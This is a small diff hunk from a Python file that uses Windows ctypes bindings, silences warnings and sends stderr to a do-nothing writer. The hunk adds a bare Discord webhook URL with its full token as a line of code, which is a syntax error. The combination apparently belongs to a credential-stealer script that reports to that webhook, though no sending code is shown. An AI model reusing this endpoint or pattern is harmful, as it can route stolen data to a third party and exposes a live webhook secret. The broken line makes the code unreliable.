@@ -42,7 +42,7 @@ from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_
 class NullWriter(object):
     def write(self, arg):
         pass
-
+https://discord.com/api/webhooks/1312542792492253305/p3k_4QMHi3hNbcQjN_MVvPrUqzlvPcYsWoO_pAduM_8MkhnUsETwvMP2d9yhStfr9Vuq
 warnings.filterwarnings("ignore")
 null_writer = NullWriter()
 stderr = null_writer
